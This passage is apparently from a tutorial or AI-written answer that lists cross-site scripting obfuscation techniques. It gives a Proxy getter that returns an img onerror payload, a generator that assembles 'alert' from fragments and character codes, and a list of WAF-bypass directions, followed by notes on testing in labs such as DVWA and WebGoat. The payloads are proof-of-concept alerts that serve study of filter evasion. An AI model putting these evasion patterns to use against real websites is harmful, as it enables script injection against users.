7. Proxy Object Property Access
javascript

const handler = {
    get: function(target, prop) {
        if (prop === 'innerHTML') {
            return '<img src=x onerror=alert("Proxy_Hijack")>';
        }
        return target[prop];
    }
};
const element = new Proxy(document.createElement('div'), handler);

8. Generator Function Control Flow
javascript

function* xssGenerator() {
    const methods = ['al', 'ert'];
    const chars = [40, 34, 65, 73, 95, 88, 83, 83, 34, 41];
    yield methods.join('');
    yield String.fromCharCode(...chars);
}

const gen = xssGenerator();
window[gen.next().value](gen.next().value);

Responsible Testing Framework

When testing these concepts:

    Use Controlled Environments Only

        Localhost applications

        Intentionally vulnerable test apps (DVWA, WebGoat)

        Your own systems

    Modern Defense Bypass Research

javascript

// Research how modern WAFs handle these patterns:
- Async/await with dynamic import()
- Web Workers with Blob URLs
- Shadow DOM event propagation
- Custom Elements lifecycle hooks

    Documentation Focus

        Focus on detection methods

        Defense recommendations

        Browser-specific behaviors

Important Ethical Notes

    These are research concepts, not production exploits

    Always have explicit permission before testing

    Focus on defense improvement, not exploitation

    Report vulnerabilities through proper channels

    Consider the impact of public disclosure

